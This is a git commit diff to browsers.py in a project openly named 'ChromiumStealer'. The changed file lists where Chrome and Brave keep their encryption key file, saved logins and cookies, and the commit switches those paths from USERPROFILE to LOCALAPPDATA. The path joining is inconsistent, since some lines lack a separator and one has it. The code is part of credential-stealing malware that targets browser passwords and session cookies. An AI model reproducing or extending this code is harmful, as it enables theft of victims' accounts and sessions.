122870ba07d40282d623b27dffb7c8f99896bbea
Devil Boi <oceanboi1337@protonmail.com>
2021-04-27 00:35:50 +0200

    Update browsers.py

--- ChromiumStealer/browsers.py
+++ ChromiumStealer/browsers.py
@@ -4,13 +4,13 @@ from enum import Enum
 class Browsers(Enum):
 
     Chrome = {
-        'state': f'{os.environ["USERPROFILE"]}\\Appdata\\Local\\Google\\Chrome\\User Data\\Local State',
-        'login': f'{os.environ["USERPROFILE"]}\\Appdata\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
-        'cookies': f'{os.environ["USERPROFILE"]}\\Appdata\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
+        'state': f'{os.environ["LOCALAPPDATA"]}Google\\Chrome\\User Data\\Local State',
+        'login': f'{os.environ["LOCALAPPDATA"]}Google\\Chrome\\User Data\\Default\\Login Data',
+        'cookies': f'{os.environ["LOCALAPPDATA"]}Google\\Chrome\\User Data\\Default\\Cookies'
     }
 
     Brave = {
-        'state': f'{os.environ["USERPROFILE"]}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State',
-        'login': f'{os.environ["USERPROFILE"]}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data',
-        'cookies': f'{os.environ["USERPROFILE"]}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies'
+        'state': f'{os.environ["LOCALAPPDATA"]}BraveSoftware\\Brave-Browser\\User Data\\Local State',
+        'login': f'{os.environ["LOCALAPPDATA"]}BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data',
+        'cookies': f'{os.environ["LOCALAPPDATA"]}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies'
     }
